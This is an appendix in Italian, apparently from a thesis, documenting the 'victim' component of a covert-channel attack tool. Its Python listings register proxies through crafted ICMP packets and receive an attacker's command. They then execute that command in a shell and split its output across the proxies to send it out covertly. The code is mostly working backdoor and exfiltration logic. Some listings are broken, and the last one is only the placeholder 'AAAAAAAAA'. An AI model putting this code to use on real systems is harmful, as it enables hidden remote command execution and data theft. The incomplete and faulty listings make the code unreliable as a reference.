\section{Appendice Victim} \label{appendice:vittima}

\subsection{Rilevamento degli argomenti passati} 
Per passare degli argomenti tramite linea di comando; 
si usano gli stessi metodi usati dall'attaccante [Code:\ref{script:appendice:attaccante:argomenti}]. 
Tuttavia ciò che cambia sono gli argomenti voluti e la loro tipologia.
\begin{itemize}
    \item In questo caso, tramite \textit{num\_proxy}, si indicherà il minimo nmero di proxy necessari. 
\end{itemize}


\subsection{Callback per aspettare la connessione dal proxy}
La funzione di callback usata per aspettare la connessione da parte del proxy è deifnita in questo modo: 
\vspace{1ex} \newline
In input richiede
\begin{enumerate}
    \item la lista con i proxy connessi 
    \item l'indirizzo IP dell'host stesso 
    \item il threading event per segnalare quando la connesisone è deifnita
    \item il lock usato quando si aggiornano dfei dati condivisi fra i thread 
    \item il minimo numero di proxy connessi necessari per iniziare l'attacco. 
    \item la tipologia di attacco da usare
\end{enumerate}
Dopodichè controlla quali protocolli sono presenti nel pacchetto e se sono tutti quelli necessari; 
procede a ricavare l'indirzzo dell'hot mittente e controlla se è già connesso. 
Nel caso lo fosse ignora il messaggio; 
altrimenti controlla se il payload nel pacchetto corrisponda al messaggio di conferma della connessione. 
\vspace{1ex} \newline
Se la situazione fossse confermata, ricava dal pacchetto la tipologia di attacco  da utilizzare e invia al proxy la conferma della ricezione dei dati e della connessione. 
Poi si aggiunge il proxy appena connesso alla lista dei proxy connessi. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={callback_wait_conn, is_proxy_already_connected, send_packet, add_proxy_to_connected_list}, emphstyle=\color{red} 
    ,emph={[2]ip_src, confirm_text, attack_type, data, pket},emphstyle={[2]\color{blue}} 
    ,emph={[3]conn_proxy, ip_host, event, lock, attack_func, num_proxy}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
]   
def callback_wait_conn(conn_proxy,ip_host,event,lock,num_proxy,attack_func): 
    def callback(pket):
        nonlocal attack_func, conn_proxy, ip_host, event, lock, num_proxy 
        if pket.haslayer(IP) and pket.haslayer(ICMP) and pket.haslayer(Raw):
            print(f"Ricevuto pacchetto da {pket[IP].src}...")
            ip_src=ipaddress.ip_address(pket[IP].src)
            if is_proxy_already_connected(ip_src, conn_proxy, lock): 
                print(f"already connected with {ip_src}:\n\t{conn_proxy}")
                return
            confirm_text=(com.CONFIRM_PROXY+ip_host.compressed).encode() 
            if confirm_text in pket[Raw].load : 
                int_version=(pket[ICMP].id>>8) ^ ord("i")
                int_code=(pket[ICMP].id & 0xFF) ^ ord("p") 
                attack_type="ipv"+str(int_version)+"_"+str(int_code)
                attack_type=attacksingleton.get_attack_function(attack_type)
                attack_func.update(attack_type)
                print(f"***Updated attack Function: {attack_func}")
                data=(com.CONFIRM_VICTIM+ip_host+ip_src).encode()
                if com.send_packet(data,ip_src): 
                    add_proxy_to_connected_list(
                        conn_proxy
                        ,ip_src
                        ,event
                        ,lock
                        ,num_proxy
                    ) 
                    print(f"Confermata la connessione per {ip_src}") 
                    return
                print(f"{ip_src} non ha risposto al messaggio di conferma. ") 
        print(f"Non confermata la connessione...")
    return callback
\end{lstlisting}
\captionof{lstlisting}{Callback per aspettare la connessione da parte del proxy} 
\label{script:appendice:victim:callback:waitConn:fromProxy} 


\subsection{Operazioni eseguibili sulla lista dei proxy connessi}
Le operazioni eseguibili sulla lista dei proxy connessi sono le seguenti:
\begin{itemize}
    \item Controllare se un indirzzo Ip è già presente nella lista e quindi verificare se il proxy è già connesso. 
    \item Aggiungere un proxy alla lista. 
    \item Verificare se si è raggiunto il numero minimo di proxy necessari. 
\end{itemize} 
\subsubsection*{Verificare se un proxy è già connesso}
Il metodo acquisisce il lock e poi controlla se l'indirizzo IP è già presente nella lista dei proxy connessi. 
Dopodichè rilascia il lock e ritorna il risultato. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={is_proxy_already_connected}, emphstyle=\color{red} 
    ,emph={[2]IPproxy, conn_proxy, is_already_connected},emphstyle={[2]\color{blue}} 
    ,emph={[3]lock}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
]   
def is_proxy_already_connected(IPproxy, conn_proxy, lock):
    if not (is_IPAddress(IPproxy) and is_list(conn_proxy) and is_lock(lock)): 
        raise Exception("send_data_to_proxies: Argomenti non corretti") 
    lock.acquire()
    is_already_connected= IPproxy in conn_proxy 
    lock.release() 
    return is_already_connected 
\end{lstlisting}
\captionof{lstlisting}{Controllo se un proxy è connesso alla vittima} 
\label{script:appendice:victim:isPrxyConnected} 
\subsubsection*{Aggiunta di un proxy alla lista dei proxy connessi}
Il metodo d'appprima verifica che gli argomenti passati siano corretti; 
dopodichè acquisice il lock e controlla se l'indirizzo IP del proxy è già presente nella lista dei proxy connessi. 
Se cioò non fosse, e quindi il proxy non è presente nella lista, lo si aggiunnge ad essa. 
\vspace{1ex} \newline
Dopodichè rilascia il lock e controlla quanti proxy si sono connessi. 
Se il numero di proxy connessi è maggiore del numero indicato in input; 
si chiede se continuare o aspettarnbe di più. 
\vspace{1ex} \newline
Nel caso si volesse continuare, la cosa viene segnalata tramite il threading Event passato. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={add_proxy_to_connected_list, reached_proxy_number}, emphstyle=\color{red} 
    ,emph={[2]conn_proxy, ip_src},emphstyle={[2]\color{blue}} 
    ,emph={[3]lock, event, num_proxy}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
]   
def add_proxy_to_connected_list(conn_proxy, ip_src, event, lock, num_proxy): 
    if not (is_list(conn_proxy) and is_IPAddress(ip_src) and is_int(num_proxy)): 
        raise(f"Argomenti non corretti") 
    if not (is_threading_Event(event) and is_threading_lock(lock)): 
        raise(f"Argomenti non corretti")
    lock.acquire() 
    if ip_src not in conn_proxy:
        conn_proxy.append(ip_src) 
    lock.release() 
    print(f"{ip_src} aggiunto alla lista dei proxy connessi\n\t{conn_proxy}")
    msg="Numero minimo di proxy raggiunto. Aspettarne di piu? [s/n]"
    if reached_proxy_number(lock, conn_proxy, num_proxy): 
        com.set_threading_Event(event) 
\end{lstlisting}
\captionof{lstlisting}{Aggiunta di un proxy alla lista dei proxy connessi} 
\label{script:appendice:victim:addProxyToList} 
\subsubsection*{Verificare se si è raggiunto in numero minimo di proxy connessi}
Il metodo verifica che gli argomenti passati siano corretti;
dopodichè acquisisce il lock e controlla se il numero di elementi pressenti nella lista (dei proxy connessi) è magigore od uguale al numero minimo di proxy necessary. 
Dopo aver rilasicato il lock; controlla il risultato del confronto effettuato. 
Nel caso sia positivo, stampa un messaggio confermando che si è raggiunto il numero necessario di proxy e ritorna True. 
Altrimenti stampa un messaggio indicando quanti proxy sono ancora necessari e ritorna False.
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={reached_proxy_number}, emphstyle=\color{red} 
    ,emph={[2]conn_proxy, num_proxy, is_enough_proxy},emphstyle={[2]\color{blue}} 
    ,emph={[3]lock}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
]   
def reached_proxy_number(lock, conn_proxy, num_proxy): 
    if not (is_list(conn_proxy) and is_lock(lock) and is_integer(num_proxy)):
        raise(f"Argoemnti non corretti") 
    lock.acquire()
    is_enough_proxy=len(conn_proxy) >= num_proxy
    lock.release() 
    if is_enough_proxy: 
        print(f"Raggiunto il numero di proxy necessari:\n\t{conn_proxy}")
        return True 
    print(f"Necessari ancora {num_proxy-len(conn_proxy)} proxy")
    return False
\end{lstlisting}
\captionof{lstlisting}{Controllo del numero di proxy connessi} 
\label{script:appendice:victim:reachedProxyNumber} 


\subsection{Callback per il timer} 
Il metodo definito, verrà chiamato dal tmier quendo scadrà il suo tempo. 
In input richiede:
\begin{enumerate}
    \item lo sniffer che sta monitorando i pacchetti 
    \item il timer stesso 
    \item l'evento che indica se si è raggiunto il numero minimo di proxy connessi necessari
    \item la funzione che il timer dovrà chiamare. 
\end{enumerate}
La funzione callback in questo specifico caso sarà sempre \textbf{reached\_proxy\_number} [Code: \ref{script:appendice:victim:reachedProxyNumber} ]
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={done_waiting_timeout, ask_bool_choice}, emphstyle=\color{red} 
    ,emph={[2]timer, callback_function},emphstyle={[2]\color{blue}} 
    ,emph={[3]sniffer, event, }, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def done_waiting_timeout(sniffer, timer, event, callback_function): 
    if not (is_sniffer(sniffer) and is_timer(timer) and is_event(event)): 
        raise Exception("done_waiting_timeout: Argomenti non corretti")   
    if not callback_function(): 
        print("Not enough proxies have arrived") 
        msg="Continuare ad aspettare ulteriori proxy? (s/n)"
        if mymethods.ask_bool_choice(msg):
            print("Continuo ad aspettare...")
            timer = threading.Timer(
                WAITING_TIME
                ,lambda: done_waiting_timeout(
                    sniffer 
                    ,timer 
                    ,event 
                    ,callback_function
                )
            )
            timer.start()
            return
        else:
            print("Smetto di aspettare...") 
    print("Enough proxies have arrived") 
    com.set_threading_Event(event)
\end{lstlisting}
\captionof{lstlisting}{Metodo eseguito quando il timer scade} 
\label{script:appendice:victim:timerDoneWaiting} 


\subsection{Aspettando il comando dall'attaccante} 
La funzione che aspetta il comando dall'attaccante richiede in input:
\begin{itemize}
    \item l'attacco con cui i dati verranno mandati alla vittima (e quindi come la vittima dovrà riceverli)
    \item l'indirizzo IP dell'host (in questo caso l'IP della vittima stessa) 
    \item la lista in cui il comando verrà memorizzato 
\end{itemize} 
Dopodichè, dopo aver chiamato il metodo \textbf{wait\_data}, controlla se i dati sono stati ricevuti e se sono validi. 
\vspace{1ex} \newline
Nel caso in  cui la lista sia vuota, procede a sostituirlo con il comando che indicherà la fine della comunicazione. 
Altrimenti ritorna come comando il primo elemento della lista. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={wait_attacker_command, wait_data}, emphstyle=\color{red} 
    ,emph={[2]command},emphstyle={[2]\color{blue}} 
    ,emph={[3]ip_host, attack_func}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def wait_attacker_command(attack_func, ip_host, command): 
    if not (is_dict(attack_func) and is_IPaddr(ip_host) and is_list(command)): 
        raise Exception(f"wait_attacker_command: argomenti non validi")
    print(f"Waiting data witch attack function: {attack_func}") 
    if attacksingleton.wait_data(attack_func, ip_host, command): 
        print(f"Finished waiting data. Comando ricevuto: {command}") 
        if len(command)==1:
            command= command[0].replace(com.CONFIRM_COMMAND,"")
        elif len(command)>1:
            print(f"Errore multipli comandi: {command}")
            command=command[0]
        elif len(command)<1: 
            print(f"Errore nessun comando: {command}")
            command=com.END_COMMUNICATION
    else: print("Comando non ricevuto") 
\end{lstlisting}
\captionof{lstlisting}{Aspettando il comando dall'attaccante} 
\label{script:appendice:victim:waitCommand} 


\subsection{Aggiungendo al comando il messaggio di fine dati} 
Quando il comando viene eseguito nella shell, è necessario un modo per rilevare quando i dati sono finiti. 
Per fare ciò, si aggiunge alla fine del comando un messaggio che indica ciò. 
Per farlo, nella funzione, si controlla su quale sistema operativo verrà eseguito e in base a quello si aggiunge questo messaggio. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={append_END_DATA_2_command}, emphstyle=\color{red} 
    ,emph={[2]command},emphstyle={[2]\color{blue}} 
    ,emph={[3]}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def append_END_DATA_2_command(command:list[str]):
    if not com.is_list(command):
        raise Exception(f"Argomenti non validi: {type(command)}")
    if sys.platform == "win32":
        command.append(f" && echo '{com.END_DATA}'")
    elif sys.platform=="linux": 
        command.append(f"; echo '{com.END_DATA}'") 
    else: print("Sistema operativo non supportato.")
\end{lstlisting}
\captionof{lstlisting}{Aggiunta del messaggio di fine dati al comando} 
\label{script:appendice:victim:appendDataCommand} 


\subsection{Prelevamento dei dati ricevuti dal comando} 
Per ricavare i dati restituiti dal comando si definisce un metodo che richeide in input il comando da eseguire. 
Dopodichè si chiama un metodso che, passato il comando da eseguire, apre una shell, lo esegue e restituisce il processo.
\vspace{1ex} \newline 
Da questo processo verranno estratti i dati ricevuti in output (stdout) e in errore (stderr). 
Per fare ciò, definiamo due liste per memorizzare questi dati e due thread che leggeranno i dati presenti negli stream. 
\vspace{1ex} \newline
Una volta avviati i thread, si apsetta che il processo termini così come i thread che leggono i dato dagli stream. 
Quando ciò succede, e tutti i thread hannoterminato la loro esecuzione, si ritorneranno le due liste che ora conterranno i dati ricavati dall'esecuzione del comando.
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={general_get_data_from_command, get_shell_command, read_stream}, emphstyle=\color{red} 
    ,emph={[2]proc_shell, stdout_lines, stderr_lines, stdout_thread, stderr_thread},emphstyle={[2]\color{blue}} 
    ,emph={[3]command, stdout. stderr}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def general_get_data_from_command(command:list[str]):
    if not isinstance(command, list):
        raise Exception(f"Argomenti non validi: {command}") 
    proc_shell=mymethods.get_shell_command("".join(x for x in command))  
    if com.is_valid_shell(proc_shell):
        print("Shell aperta con successo...") 
    else: raise Exception(f"Shell non valida {proc_shell}") 
    stdout_lines = []
    stderr_lines = [] 
    stdout_thread = threading.Thread(
        target=read_stream, args=(proc_shell.stdout, stdout_lines, "OUT")
    )
    stderr_thread = threading.Thread(
        target=read_stream, args=(proc_shell.stderr, stderr_lines, "ERR")
    ) 

    stdout_thread.start()
    stderr_thread.start() 
    proc_shell.wait()
    proc_shell.terminate()
    stdout_thread.join()
    stderr_thread.join() 
    return stdout_lines, stderr_lines
\end{lstlisting}
\captionof{lstlisting}{Ricavando i dati dall'esecuzione del comando} 
\label{script:appendice:victim:general:getDataCommand} 
\vspace{2ex} 
La lettura dei dati dallo stream avviene in questo modo: 
\begin{enumerate}
    \item In input viene passato lo stream da cui leggere i dati, il buffer in cui memorizzare i dati letti e un'etichetta che identificherà quale stream si sta leggendo. 
    \item Dopodichè si legge una linea dallo stream finchè non si avrà una linea vuota (o nulla). 
    Questo ci indicherà che non ci sono ulteriori dati dal leggere nello stream. 
    \item Per ogni linea non vuota, si sanitizzerà il suo ocntenuto, e poi verrà aggiunta alla lista che conterrà tutte le lineeprecedenti. 
    \item Infine lo stream verrà chiuso e nel buffer si avranno tutti i dati che erano presenti in esso. 
\end{enumerate}
%\vspace{2ex} \newline
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={read_stream}, emphstyle=\color{red} 
    ,emph={[2]stream, buffer, label},emphstyle={[2]\color{blue}} 
    ,emph={[3]line}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def read_stream(stream, buffer, label=""):
    for line in iter(stream.readline, ''):
        if line:
            decoded = line.rstrip() 
            buffer.append(decoded)
    stream.close()
\end{lstlisting}
\captionof{lstlisting}{Lettura dei dati dallo stream} 
\label{script:appendice:victim:readStream } 


\subsection{Inoltro dei dati ai proxy connessi} 
Una volta ricavati i dati dal comando, la vittima dovrà inoltrarli ai proxy che si sono collegatio. 
Per farlo, si definisce un metodo che funziona in questa maniera. 
\vspace{1ex} \newline
In input richiede:
\begin{itemize}
    \item i dati da inviare ai vari proxy
    \item la lista contenente gli indirizzi IP dei proxy connessi
    \item il tipo di attacco da usare per inviare i dati. Ciò definirà come i dati verranno inviati ai proxy. 
\end{itemize} 
Dopodichè si inizialista la lista che conterrà i dati che ciascun proxy dovra ricevere [Code:\ref{script:appendice:victim:sendData:toProxy} line:5]. 
gli elemenmti che la popoleranno, saranno delle stringhe le quali indicheranno non solo il dato ma anche il suo ordine. 
In questo modo, quando il proxy riceverà i dati, saprà come riordinare i dati.
\begin{itemize}
    \item L'indice viene ricavato iterando sul range che va da 0 sino alla dimensione della lista (contenente i dati da inoltrare). 
\end{itemize} 
Alla fine di questa parte sapremo quali dati ciascun proxy dovra ricevere. 
\vspace{1ex} \newline 
Prima di inviare il tutto, procediamo a rendere la lista di stringhe, che il proxy dovrà ricevere, come una singola stringa. 
Per unire i dati, si itera su ciascun elemento della lista (associato al determinato proxy) e 
si uniscono le stringhe tramite separatore \texttt{||} [Code:\ref{script:appendice:victim:sendData:toProxy} line:9]. 
Alla fine avremo che la lista conterrà (e che ciascun proxy dovrà ricevere) una singola stringa per proxy. 
\vspace{1ex} \newline
Dopodichè si procede a iterare sulla lista, a cui sono stati aggiuntio i dati precedenti, così da poter inviare la stringa ai proxy.
\begin{itemize}
    \item Avremo che un proxy riceverà una stringa del tipo:\newline\textbf{0 \&\& dato1 $||$ 1 \&\& dato2 $||$ 2 \&\& dato3 $||$ \dots}
\end{itemize} 
Una volta che i dati sonostati mandati a tutti i proxy, si procede ad inviare un messaggio che indica che tutti i dati sono stati inviati [Code:\ref{script:appendice:victim:sendData:toProxy} line:25].
 e che questo sarà l'ultimo pacchetto che verrà mandato. 

\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={send_data_to_proxies, send_data, send_lastpacket_toProxies}, emphstyle=\color{red} 
    ,emph={[2]data_4_proxies, string, data, unavailable_proxy},emphstyle={[2]\color{blue}} 
    ,emph={[3]data2send, conn_proxy, attack_func, index}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def send_data_to_proxies(data2send, conn_proxy, attack_func): 
    if not (is_dict(attack_func) and is_list(conn_proxy) and is_list(data2send)): 
        raise Exception("send_data_to_proxies: Argomenti non corretti") 
    if not com.is_list(data2send) or len(data2send)<=0:
        raise ValueError(f"Lista nessun dato presente {data2send}")   
    data_4_proxies:list[list]=[[] for _ in conn_proxy]
    for index in range(len(data2send)): 
        string=str(index)+"&&"+data2send[index]
        data_4_proxies[index % len(conn_proxy)].append(string)
    for index in range(len(data_4_proxies)):
        data_4_proxies[index]="".join(
            data_4_proxies[index][j] if j==0 
            else "||"+data_4_proxies[index][j] 
            for j in range(len(data_4_proxies[index]))
        )
    for index in range(len(data_4_proxies)): 
        data=None  
        if isinstance(data_4_proxies[index], bytes): 
            data=data_4_proxies[index]
        elif isinstance(data_4_proxies[index], str): 
            data=data_4_proxies[index].encode()
        else: print("data: Caso non contemplato")
        print(f"Sending to {conn_proxy[index]}: {data}") 
        attacksingleton.send_data(attack_func, data, conn_proxy[index]) 
    try: 
        unavailable_proxy=send_lastpacket_toProxies(attack_func, conn_proxy) 
        print(f"Non hanno ricevuto l'aggiornamento {unavailable_proxy}")
        print(f"Hanno ricevuto l'aggiornamento {conn_proxy}")
    except Exception as e:
        raise Exception(f"send_data_to_proxies: {e}") 
\end{lstlisting}
\captionof{lstlisting}{Inviando i dati ai proxy connessi}  
\label{script:appendice:victim:sendData:toProxy} 
\vspace{2ex} 
Per mandare il messaggio che indica che i dati sono stati inviati, si definisce un metodo che richiede in input:
\begin{itemize}
    \item la funzione di attacco da usare per inviare i dati
    \item la lista dei proxy connessi
\end{itemize}
Dopodichè per ogni indirizzo IP presente nella lista dei proxy connessi, si invia il messaggio in questione. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={send_lastpacket_toProxies, send_data}, emphstyle=\color{red} 
    ,emph={[2]unavailable_proxy, data, proxy},emphstyle={[2]\color{blue}} 
    ,emph={[3]attack_function, proxy_list}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def send_lastpacket_toProxies(attack_function, proxy_list): 
    if not (is_dict(attack_function) and is_list(proxy_list)): 
        raise Exception("send_lastpacket_toProxies: Argomenti non corretti")  
    print(f"Aggiorniamo i proxy. Questo l'ultimo pacchetto")
    unavailable_proxy=[]
    for proxy in proxy_list: 
        data=(com.LAST_PACKET).encode() 
        attacksingleton.send_data(attack_function, data, proxy) 
    return unavailable_proxy
\end{lstlisting}
\captionof{lstlisting}{Send LAST\_PACKET ai proxy}  
\label{script:appendice:victim:sendLastPacket} 


\subsection{Operazioni eseguibili sulla lista dei proxy connessi} 

\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={}, emphstyle=\color{red} 
    ,emph={[2]},emphstyle={[2]\color{blue}} 
    ,emph={[3]}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
AAAAAAAAA
\end{lstlisting}
\captionof{lstlisting}{Aspettando i dati dalla vittima}  
\label{script:appendice:victim:waitConn:fromProxy} 



